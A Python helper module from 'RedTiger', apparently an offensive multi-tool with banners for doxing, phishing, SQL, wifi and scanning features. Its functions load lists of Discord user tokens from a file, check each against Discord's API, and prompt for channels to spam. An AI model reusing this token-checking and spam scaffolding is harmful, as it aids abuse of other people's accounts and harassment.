# Copyright (c) RedTiger (https://redtiger.shop)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from .Config import *
try:
    import colorama
    import ctypes
    import subprocess
    import os
    import time
    import sys
    import datetime
    import sys
    import requests
    from pathlib import Path
except Exception as e:
    import os
    print(f"[x] | Error Module (Restart Setup.bat): {e}")
    os.system("pause")

color_webhook = 0xa80505
username_webhook = name_tool
avatar_webhook = 'https://cdn.discordapp.com/attachments/1268900329605300234/1276010081665683497/RedTiger-Logo.png?ex=66cf38be&is=66cde73e&hm=696c53b4791044ca0495d87f92e6d603e8383315d2ebdd385aaccfc6dbf6aa77&'

color = colorama.Fore
red = color.RED
white = color.WHITE
green = color.GREEN
reset = color.RESET
blue = color.BLUE
yellow = color.YELLOW

try: username_pc = os.getlogin()
except: username_pc = "username"

tool_path = os.path.dirname(os.path.abspath(__file__)).split("Settings")[0].strip()

def current_time_day_hour():
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

def current_time_hour():
    return datetime.datetime.now().strftime('%H:%M:%S')

BEFORE = f'{red}[{white}'
AFTER = f'{red}]'

BEFORE_GREEN = f'{green}[{white}'
AFTER_GREEN = f'{green}]'

INPUT = f'{BEFORE}>{AFTER} |'
INFO = f'{BEFORE}!{AFTER} |'
ERROR = f'{BEFORE}x{AFTER} |'
ADD = f'{BEFORE}+{AFTER} |'
WAIT = f'{BEFORE}~{AFTER} |'

GEN_VALID = f'{BEFORE_GREEN}+{AFTER_GREEN} |'
GEN_INVALID = f'{BEFORE}x{AFTER} |'

INFO_ADD = f'{white}[{red}+{white}]{red}'

def MainColor(text):
    start_color = (168, 5, 5)  
    end_color = (255, 118, 118)

    num_steps = 9

    colors = []
    for i in range(num_steps):
        r = start_color[0] + (end_color[0] - start_color[0]) * i // (num_steps - 1)
        g = start_color[1] + (end_color[1] - start_color[1]) * i // (num_steps - 1)
        b = start_color[2] + (end_color[2] - start_color[2]) * i // (num_steps - 1)
        colors.append((r, g, b))
    
    colors += list(reversed(colors[:-1]))  
    
    gradient_chars = '┴┼┘┤└┐─┬├┌└│]░▒░▒█▓▄▌▀()'
    
    def text_color(r, g, b):
        return f"\033[38;2;{r};{g};{b}m"
       
    lines = text.split('\n')
    num_colors = len(colors)
    
    result = []
    for i, line in enumerate(lines):
        for j, char in enumerate(line):
            if char in gradient_chars:
                color_index = (i + j) % num_colors
                color = colors[color_index]
                result.append(text_color(*color) + char + "\033[0m")
            else:
                result.append(char)
        if i < len(lines) - 1:
            result.append('\n')
    
    return ''.join(result)



def MainColor2(text):
    start_color = (168, 5, 5)  
    end_color = (255, 118, 118)

    num_steps = 9

    colors = []
    for i in range(num_steps):
        r = start_color[0] + (end_color[0] - start_color[0]) * i // (num_steps - 1)
        g = start_color[1] + (end_color[1] - start_color[1]) * i // (num_steps - 1)
        b = start_color[2] + (end_color[2] - start_color[2]) * i // (num_steps - 1)
        colors.append((r, g, b))
    
    colors += list(reversed(colors[:-1]))  
    
    def text_color(r, g, b):
        return f"\033[38;2;{r};{g};{b}m"
       
    lines = text.split('\n')
    num_colors = len(colors)
    
    result = []
    for i, line in enumerate(lines):
        for j, char in enumerate(line):
            color_index = (i + j) % num_colors
            color = colors[color_index]
            result.append(text_color(*color) + char + "\033[0m")
        
        if i < len(lines) - 1:
            result.append('\n')
    
    return ''.join(result)


def Censored(text):
    censored = ["loxy", website, creator]
    for censored_text in censored:
        if text in censored:
            print(f'{BEFORE + current_time_hour() + AFTER} {ERROR} Unable to find "{white}{text}{red}".')
            Continue()
            Reset()
        elif censored_text in text:
            print(f'{BEFORE + current_time_hour() + AFTER} {ERROR} Unable to find "{white}{text}{red}".')
            Continue()
            Reset()
        else:
            pass

def Title(title):
    if sys.platform.startswith("win"):
        ctypes.windll.kernel32.SetConsoleTitleW(f"{name_tool} {version_tool} | {title}")
    elif sys.platform.startswith("linux"):
        sys.stdout.write(f"\x1b]2;{name_tool} {version_tool} | {title}\x07")
        
def Clear():
    if sys.platform.startswith("win"):
        os.system("cls")
    elif sys.platform.startswith("linux"):
        os.system("clear")

def Reset():
    if sys.platform.startswith("win"):
        file = 'python', os.path.join(tool_path, "RedTiger.py")
        subprocess.run(file, shell=True)

    elif sys.platform.startswith("linux"):
        file = 'python3', os.path.join(tool_path, "RedTiger.py")
        subprocess.run(file, shell=True)

def StartProgram(program):
    if sys.platform.startswith("win"):
        file = 'python', os.path.join(tool_path, "Settings", "Program", program)
        subprocess.run(file, shell=True)

    elif sys.platform.startswith("linux"):
        file = 'python3', os.path.join(tool_path, "Settings", "Program", program)
        subprocess.run(file, shell=True)

def Slow(texte):
    delai = 0.03
    lignes = texte.split('\n')
    for ligne in lignes:
        print(ligne)
        time.sleep(delai)

def Continue():
    input(f"{BEFORE + current_time_hour() + AFTER} {INFO} Press to continue -> " + reset)

def Error(e):
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error: {white}{e}", reset)
    Continue()
    Reset()

def ErrorChoiceStart():
    print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} Invalid Choice !", reset)
    time.sleep(1)

def ErrorChoice():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Invalid Choice !", reset)
    time.sleep(3)
    Reset()

def ErrorId():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Invalid ID !", reset)
    time.sleep(3)
    Reset()

def ErrorUrl():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Invalid URL !", reset)
    time.sleep(3)
    Reset()

def ErrorResponse():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Invalid Response !", reset)
    time.sleep(3)
    Reset()

def ErrorEdge():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Edge not installed or driver not up to date !", reset)
    time.sleep(3)
    Reset()

def ErrorToken():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Invalid Token !", reset)
    time.sleep(3)
    Reset()
    
def ErrorNumber():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Invalid Number !", reset)
    time.sleep(3)
    Reset()

def ErrorWebhook():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Invalid Webhook !", reset)
    time.sleep(3)
    Reset()

def ErrorCookie():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Invalid Cookie !", reset)
    time.sleep(3)
    Reset()

def ErrorUsername():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Invalid Username !", reset)
    time.sleep(3)
    Reset()

def ErrorModule(e):
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error Module (Restart Setup.bat): {white}{e}", reset)
    Continue()
    Reset()

def OnlyWindows():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} This function is only available on Windows 10/11 !", reset)
    Continue()
    Reset()

def OnlyLinux():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} This function is only available on Linux !", reset)
    Continue()
    Reset()

def CheckWebhook(webhook):
    if webhook.lower().startswith("https://discord.com/api/webhooks"):
        pass
    elif webhook.lower().startswith("http://discord.com/api/webhooks"):
        pass
    elif webhook.lower().startswith("https://canary.discord.com/api/webhooks"):
        pass
    elif webhook.lower().startswith("http://canary.discord.com/api/webhooks"):
        pass
    elif webhook.lower().startswith("https://discordapp.com/api/webhooks"):
        pass
    elif webhook.lower().startswith("http://discordapp.com/api/webhooks"):
        pass
    else:
        ErrorWebhook()

def ChoiceMultiChannelDiscord():
    try:
        num_channels = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} How many spam channels -> {reset}"))
    except:
        ErrorNumber()
    
    selected_channels = [] 
    number = 0
    for _ in range(num_channels):
        try:
            number += 1
            selected_channel_number = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Channel Id {number}/{num_channels} -> {reset}")
            selected_channels.append(selected_channel_number)
        except:
            ErrorId()

    return selected_channels


def ChoiceMultiTokenDisord():

    def CheckToken(token_number, token):
        response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
        
        if response.status_code == 200:
            user = requests.get(
                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            username_discord = user['username']
            token_sensur = token[:-25] + '.' * 3
            print(f" {BEFORE}{token_number}{AFTER} -> {red}Status: {white}Valid{red} | User: {white}{username_discord}{red} | Token: {white}{token_sensur}")
        else:
            print(f" {BEFORE}{token_number}{AFTER} -> {red}Status: {white}Invalid{red} | {red}Token: {white}{token}")

    file_token_discord_relative = "\\2-Input\\TokenDisc\\TokenDisc.txt"
    file_token_discord = os.path.join(tool_path, "2-Input", "TokenDisc", "TokenDisc.txt")
    tokens = {}
    token_discord_number = 0

    with open(file_token_discord, 'r') as file_token:
        for line in file_token:
            if not line.strip() or line.isspace():
                continue
            token_discord_number += 1
        
        if token_discord_number == 0:
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} No Token Discord in file: {white}{file_token_discord_relative}{red} Please add tokens to the file.")
            Continue()
            Reset()
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} {white}{token_discord_number}{red} Token Discord found ({white}{file_token_discord_relative}{red})")
    
    try:
        num_tokens = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} How many token (max {token_discord_number}) -> {reset}"))
        if num_tokens > token_discord_number:
            ErrorNumber()
    except:
        ErrorNumber()

    token_discord_number = 0
    with open(file_token_discord, 'r') as file_token:
        print()
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Token Discord ({white}{file_token_discord}{red}):\n")
        for line in file_token:
            if not line.strip() or line.isspace():
                continue
            
            token_discord_number += 1
            modified_token = line.strip()
            tokens[token_discord_number] = modified_token
            CheckToken(token_discord_number, modified_token)

    number = 0
    selected_tokens = []
    print()
    for _ in range(num_tokens):
        try:
            number += 1
            selected_token_number = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Token Number {number}/{num_tokens} -> {reset}"))
        except:
            ErrorNumber()
        
        selected_token = tokens.get(selected_token_number)
        if selected_token:
            selected_tokens.append(selected_token)
        else:
            ErrorNumber()
    return selected_tokens


def Choice1TokenDiscord():
    def CheckToken(token_number, token):
        response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
        
        if response.status_code == 200:
            user = requests.get(
                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            username_discord = user['username']
            token_sensur = token[:-25] + '.' * 3
            print(f" {BEFORE}{token_number}{AFTER} -> {red}Status: {white}Valid{red} | User: {white}{username_discord}{red} | Token: {white}{token_sensur}")
        else:
            print(f" {BEFORE}{token_number}{AFTER} -> {red}Status: {white}Invalid{red} | {red}Token: {white}{token}")

    file_token_discord_relative = "\\2-Input\\TokenDisc\\TokenDisc.txt"
    file_token_discord = os.path.join(tool_path, "2-Input", "TokenDisc", "TokenDisc.txt")

    tokens = {}
    token_discord_number = 0

    with open(file_token_discord, 'r') as file_token:
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Token Discord ({white}{file_token_discord_relative}{red}):\n")
        for line in file_token:
            if not line.strip() or line.isspace():
                continue
    
            token_discord_number += 1
            modified_token = line.strip()
            tokens[token_discord_number] = modified_token
            CheckToken(token_discord_number, modified_token)

    if not tokens:
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} No Token Discord in file: {white}{file_token_discord_relative}{red} Please add tokens to the file.")
        Continue()
        Reset()
        return None

    try:
        selected_token_number = int(input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Token Number -> {reset}"))
    except:
        ErrorChoice()

    selected_token = tokens.get(selected_token_number)
    if selected_token:
        r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': selected_token, 'Content-Type': 'application/json'})
        if r.status_code == 200:
            pass
        else:
            ErrorToken()
    else:
        ErrorChoice()
    return selected_token

tor_banner = MainColor2(r"""
                                                                       ..                                   
                                                                     .:@ :...                               
                .:::::::::::::::::::::::::::::::::.             ....-@@@+..                                 
               .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.           .-@@@@@-.                                    
               :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.          .=@@@@-.                                      
               :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.          -@@@@-.                                       
               :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.      @@ :@@#:.                                         
               :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.       %  @%+:                                          
                ::::::::-*@@@@@@@@@@@@@@@*-::::::::        @@ #:@@@                           ..::::::::    
                         -@@@@@@@@@@@@@@@=                 @@ @+@@@@                      .::+@@@@@@@@@@:   
                         -@@@@@@@@@@@@@@@                @@@  @+@%%@@                    -*@@@@@@@@@@@@@:   
                         :@@@@@@@@@@@@@@@            @@@@    @@+.@@=:@@@@              :*@@@@@@@@@@@@@@@:   
                         :@@@@@@@@@@@@@@@          @@@    ..@:@@+ @@%=-:=@@@          :*@@@@@@@@@@@@@@@@:   
                         :@@@@@@@@@@@@@@@       @@@    .-@@@::@#@# @@#@%*-:@@@       .*@@@@@@@@@@@@@@@@@:   
                         :@@@@@@@@@@@@@@@     @@@   ..@@@+:--=@#.@% @#%@@@#=:@@      *@@@@@@@@@@@@@*-::.    
                         :@@@@@@@@@@@@@@@    @@@  :.@@..-++=@@@@. @ =@+@@@@@#:@@@   -@@@@@@@@@@@@@*:        
                         :@@@@@@@@@@@@@@@    @@  :*@.:-=-+@@%-@@@# @ @:@@@@@@#:@@   -@@@@@@@@@@@@@-         
                         :@@@@@@@@@@@@@@@    @@ .-@ -+=@@@=++=@.-@ @ @-@@@@@@@-@@@  -@@@@@@@@@@@@@.         
                         :@@@@@@@@@@@@@@@    @@ .@@ *@@@:*%=.@@@ @-@ @-%@@@@@@-@@@  -@@@@@@@@@@@@@.         
                         :@@@@@@@@@@@@@@@    @@   @ :@@.%@+-@ *@@ @@ @-@@@@@@#.@@   -@@@@@@@@@@@@@.         
                         :@@@@@@@@@@@@@@@     @@  @@ @@ %@.@ :@@@ @@@@-@@@@@*:@@@   -@@@@@@@@@@@@@.         
                         :@@@@@@@@@@@@@@@      @@   @ @-.* @ -%@@-@ @@*@@@#=:@@     -@@@@@@@@@@@@@.         
                         :@@@@@@@@@@@@@@@       @@@  -@@@  @@ .%* #@@-%#=:-@@@      -@@@@@@@@@@@@@.         
                         -@@@@@@@@@@@@@@%         @@@@   @.  @ =*@@@...-@@@@        -@@@@@@@@@@@@@.         
                          .:::::::::::::.             @@@@@@@@@@@@-*@@@@             ::::::::::::.  
""")

discord_banner = MainColor2(r"""
                                              @@@@                @%@@                                      
                                       @@@@@@@@@@@@               @@@@@@@@@@%                               
                                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                         
                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
                               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                       
                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     
                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                    
                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                   
                          %@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@%                  
                          %@@@@@@@@@@@@@@@@        %@@@@@@@@@@@%@        @@@@@@@@@@@@@@@@@                  
                          %@@@@@@@@@@@@@@@          @@@@@@@@@@@@          @@@@@@@@@@@@@@@%                  
                         %@@@@@@@@@@@@@@@@          @@@@@@@@@@@%          %@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@%         @@@@@@@@@@@%         %@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@      %@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@%                 
                         %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                           @%@@@@@@@@@@@@@%@@   @@@@%@@@@@@@@@%%%@%@@  @@@@@@@@@@@@@@@@@@                   
                              @@%@@@@@@@@@@@@@                        @%@@@@@@@@@@@%@@                      
                                   @%@@@@@@@                            @@@@@@%%@                           
                                         @@                              @@                           
""")

dox_banner = MainColor2(r"""                                            
                  .:+*#%%#####*++++-.             
                :#%%*+*+-.....                    
             .=%%+++:..                           
           .=%#++=.                               
          -%%+++.                                 
      .  =%%++-          ....                     
      #%+#%++=.        .:#%%%*:                   
      :#@%#+=          :*+:-*%#:                  
       .*@@#.         .-%*::-%%#.                 
        .-%@@%-.      .=%%--%%%-                  
          .:--=*+-:.:-#%%%%%%%%*.                      ██████╗   ██████╗  ██╗  ██╗
               .:-*#%%%%%%%%%%%%%-                     ██╔══██╗ ██╔═══██╗ ╚██╗██╔╝
                  .+%%%*+*%%%%%%%%+...                 ██║  ██║ ██║   ██║  ╚███╔╝ 
                  .+%@@%%%%*#%%%%%%%%%*-.              ██║  ██║ ██║   ██║  ██╔██╗
                   .*%@%%%%%%%%%%%%%%%%%#-.            ██████╔╝ ╚██████╔╝ ██╔╝ ██╗
                   .*%%%%%%%%%%%+#%%%%%%%%%*-.         ╚═════╝   ╚═════╝  ╚═╝  ╚═╝
                  .=%%%%%%%%%%%%@%*%%%%%####=-==  
                  :*%%%%%%%%%%%%%%%*#%%%%#+=-==+  
                 .+=*%#%%%%%%%%%%%%%**%%#+**+-:-  
                .-=::*-%%%%%%%%%%%%###*-*%###+:   
                ...:..%%%%%%%%%%%%%%#:=*+-:.      
                     *%%%%%%%%%%%%%%%%.           
                    :#%%%%%%%%%%%%%%%%+           
                   .*%%%%%%%%%%%%%%%%%#.          
                  .=%%%%%%%%%%%%%%%%%%#:          
                  .+%%%%%%%%%%%%%%%%%%%*.         
                    :+*#%%%@%%%%%%%%%%%%#:.       
                      ..:==+*#%#*=-:.:-+***:.""")


osint_banner = MainColor2(r"""                                                                                                
                                          ...:----:...                                              
                                     .:=#@@@@@@@@@@@@@@%*-..                                        
                                  .:#@@@@@@@%#*****#%@@@@@@@+..                                     
                               ..-@@@@@%-...... ........+@@@@@@..                                   
                               :%@@@@=..   .#@@@@@@@@#=....+@@@@*.                                  
                             .+@@@@=.      .*@@@%@@@@@@@@=...*@@@@:.                                
                            .#@@@%.                 .=@@@@@=. .@@@@-.                               
                           .=@@@#.                    .:%@@@*. -@@@%:.                              
                           .%@@@-                       .*@@*. .+@@@=.                              
                           :@@@#.                              .-@@@#.                              
                           -@@@#                                :%@@@.                              
                           :@@@#.                              .-@@@#.                              
                           .%@@@-.                             .+@@@=.                              
                           .+@@@#.                             -@@@%:.                              
                            .*@@@%.                          .:@@@@-.                               
                             .+@@@@=..                     ..*@@@@:.                                
                               :%@@@@-..                ...+@@@@*.                                  
                               ..-@@@@@%=...         ...*@@@@@@@@#.                                 
                                  .:*@@@@@@@%*++++**@@@@@@@@=:*@@@@#:.                              
                                     ..=%@@@@@@@@@@@@@@%#-.   ..*@@@@%:.                            
                                        .....:::::::....       ...+@@@@%:                           
                                                                  ..+@@@@%-.                        
                                                                    ..=@@@@%-.                      
                                                                      ..=@@@@@=.                    
                                                                         .=%@@@@=.                  
                                                                          ..-%@@@-.                 
                                                                             ....""")

wifi_banner = MainColor2(r"""
                                                 @@@@@@@@@@@@@@@@@@@                                 
                                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                         
                                    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                    
                                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
                             @@@@@@@@@@@@@@@@@@                       @@@@@@@@@@@@@@@@@@             
                           @@@@@@@@@@@@@@                                   @@@@@@@@@@@@@@@          
                        @@@@@@@@@@@@@              @@@@@@@@@@@@@@@              @@@@@@@@@@@@@        
                       @@@@@@@@@@@          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@          @@@@@@@@@@@       
                       @@@@@@@@         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         @@@@@@@@       
                        @@@@@        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@        
                                  @@@@@@@@@@@@@@@                   @@@@@@@@@@@@@@@                  
                                @@@@@@@@@@@@@                           @@@@@@@@@@@@@                
                               @@@@@@@@@@            @@@@@@@@@@@            @@@@@@@@@@               
                                @@@@@@@         @@@@@@@@@@@@@@@@@@@@@         @@@@@@@                
                                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                            
                                          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                                         @@@@@@@@@@@             @@@@@@@@@@@                         
                                        @@@@@@@@@                   @@@@@@@@@                        
                                         @@@@@@        @@@@@@@        @@@@@@                         
                                                    @@@@@@@@@@@@@                                    
                                                   @@@@@@@@@@@@@@@                                   
                                                  @@@@@@@@@@@@@@@@@                                  
                                                  @@@@@@@@@@@@@@@@@                                  
                                                   @@@@@@@@@@@@@@@                                   
                                                    @@@@@@@@@@@@@                                    
                                                       @@@@@@@                                       
""")


phishing_banner = MainColor2(r"""
                                                         .+#%@@%#+.                                     
                                                    .#@@@@@@@@@@@@@@@@#.                                
                                                  +@@@@@@@@@@@@@@@@@@@@@@*                              
                                                .%@@@@@@@@@@@@@@@@@@@@@@@@%.                            
                                                %@@@@@@@@@@@@@@@@@@@@@@@@@@%                            

                                               %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#                          
                                                -..........................-.                           
                                                %@@@@@@%%@@@@@@@@@@@%@@@@@@%                            
                                                %@@@#     .%@@@@%.     *@@@%                            
                                                . :+%%+--+%@#::#@%*--+%%+: .                            
                                                                           .                            
                                                 :                        :                             
                                                  -                      =                              
                                                    -                  -                                
                                                       -=          --                                   
                                               -+#%@@@@@@=        =@@@@@@%#+-                           
                                            *@@@@@@@@@@@@=        =@@@@@@@@@@@@*                        
                                          *@@@@@@@@@@@@@@+        +@@@@@@@@@@@@@@#                      
                                         *@@@@@@@@@@@@@@@@%=    -%@@@@@@@@@@@@@@@@#                     
                                        -@@@@@@@@@@@@@@@@@@@%#*%@@@@@@@@@@@@@@@@@@@-                    
                                        -@@@@@@@@@@@@@@@@@@@%::%@@@@@@@@@@@@@@@@@@@-                    
                                        -@@@@@@@@@@@@@@@@@@@%::%@@@@@@@@@@@@@@@@@@@-                    
                                        -@@@@@@@@@@@@@@@@@@@%::%@@@@@@@@@@@@@@@@@@@-  """)

decrypted_banner = MainColor2(r"""
                                         ^M@@@@@@@@@v                                    
                                      v@@@@@@@@@@@@@@@@@                                 
                                    _@@@@@@@}    ;a@@@@@@@                               
                                   M@@@@@            @@@@@@                              
                                  ;@@@@@              O@@@@@                             
                                  @@@@@v               @@@@@                             
                                  @@@@@;               @@@@@                             
                                  @@@@@;                                                 
                                  @@@@@;        v@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         
                                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@       
                                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@@j     @@@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@v       @@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@@@_   @@@@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      
                                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@|      
                                               ^@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@O  """)


encrypted_banner = MainColor2(r"""
                                                       j@@@@@^                                 
                           _@v   p@@@@j           j@@@@@@@@@@@@@@@;          |@@@@M   v@}      
                          @@@@@} >@@@@    v@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@p    @@@@_ _@@@@@     
                          >@@@v    @@     v@@@@@@@@@@@@      p@@@@@@@@@@@a     @@    j@@@_     
                           ^@@     @@@@   |@@@@@@@@@@^ @@@@@@; @@@@@@@@@@p   p@@@     M@;      
                           ^@@            >@@@@@@@@@@ p@@@@@@@ M@@@@@@@@@j            M@;      
                           ^@@@@@@@@@@@}   @@@@@@@@|            >@@@@@@@@;   @@@@@@@@@@@;      
                                           }@@@@@@@|    O@@@    >@@@@@@@M                      
                          |@@@@             @@@@@@@|     M@     >@@@@@@@^            @@@@j     
                          @@@@@@@@@@@@@@@>   @@@@@@|    O@@@    >@@@@@@    @@@@@@@@@@@@@@@     
                            ^                 @@@@@v            }@@@@@^                ^       
                                 p@@@@@@@@@^   M@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@p            
                                 p@_            ^@@@@@@@@@@@@@@@@@@>            >@a            
                                @@@@O              @@@@@@@@@@@@@@              J@@@@           
                               ;@@@@@                 J@@@@@@p                 @@@@@>          
                                  ;              p@              p@>  M@@_       ;             
                                          @@@@p  p@_  ;      j_  a@@@@@@@@j                    
                                         ^@@@@@@@@@   v@_   O@}       M@@_                     
                                            ;         p@|   O@}      }}                        
                                                    >@@@@@  O@@@@@@@@@@@J                      
                                                     p@@@j         ;@@@@^                      """)


scan_banner = MainColor2(r"""
                                                            >@@|                                                
                                                            >@@|                                                
                                                            >@@|                                                
                                                            >@@|                                                
                                                   >|a@@@@@@@@@|                                                
                                              }@@@@@@@@@@@@@@@@| 000M|                                          
                                          ;@@@@@@O  @@@@@@@@@@@|  j000000_                                      
                                       }@@@@@v   |@@@@@@@@@@@@@| 00J  |00000j                                   
                                     @@@@@_     @@@@@@@@@@@@@@@| 0000    ;00000^                                
                                  ;@@@@v       _@@@@@@@     >@@| 0000v      }0000_                              
                                ^@@@@_         @@@@@@@      ^O@| 00000        ;0000_                            
                                 @@@@;         @@@@@@@      ;p@| 00000         0000^                            
                                   @@@@p       >@@@@@@@^    >@@| 0000v      J0000;                              
                                     O@@@@|     M@@@@@@@@@@@@@@| 0000    >00000                                 
                                       ;@@@@@J^  }@@@@@@@@@@@@@| 00v  j00000}                                   
                                          >@@@@@@@_;@@@@@@@@@@@| ;M000000_                                      
                                              >@@@@@@@@@@@@@@@@| 00000}                                          
                                                   ^jpM@@@@@@@@|                                                
                                                            >@@|                                                
                                                            >@@|                                                
                                                            >@@|                                                
                                                            >@@|                                                
                                                            >@@| 
""")



sql_banner = MainColor2(r"""
                                                                                   ^                      
                                                                                 J@@M                     
                                                                        ^         @@@@^                   
                                                                     ;@@@>         J@@@                   
                                                                      ;@@@J      ;j j@@@}                 
                                                                       ^@@@O  ^J@@@@^;@@@}                
                                                                   >@@@; @@@@^;@@@@@> ;@@@O               
                                                                >j _@@@@j p@@@^;@|      @@@>              
                                                              }@@@@  @@@@j J@@@>                          
                                                          ^a@@ _@@@@;_@@@@a }@@@>                         
                                                       ^} v@@@@^;@@@@@@@@@@@ >@@@v                        
                                                     |@@@@ ^@@@@J@@@@@@@@@@@@;^@@@J                       
                                                  J@M }@@@@ _@@@@@@@@@@@@@@j    @@j                       
                                               ; v@@@@ >@@@@@@@@@@@@@@@@j                                 
                                            ^@@@@ ;@@@@v@@@@@@@@@@@@@j^                                   
                                            a@@@@@ >@@@@@@@@@@@@@@a                                       
                                            |@@@@@@@@@@@@@@@@@@J                                          
                                          |a ;@@@@@@@@@@@@@@a;                                            
                                         @@@@ ;@@@@@@@@@@@;                                               
                                        |@@@@@> @@@@@@@>                                                  
                                     }@@@pO@MJ   >pp_                                                     
                                  ;@@@a                                                                   
                               ;@@@p;                                                                     
                            >p@@M>                                                                        
                           }@@>                                                                           
""")



map_banner = MainColor2(r"""
                                      :**+ :::+*@@.                                                         
                              +: @ = =.  :#@@@@@@@@                 :     .=*@@#     -                      
                 @@@@-. :=: +@@.:% *=@@:   @@@@@@          :#=::     .:@=@@@@@@@@@@@@@@@@@@@@--.-:          
             .#@@@@@@@@@@@@@@@@@@:# .@@   #@@    :@-     +@@:@@@+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*        
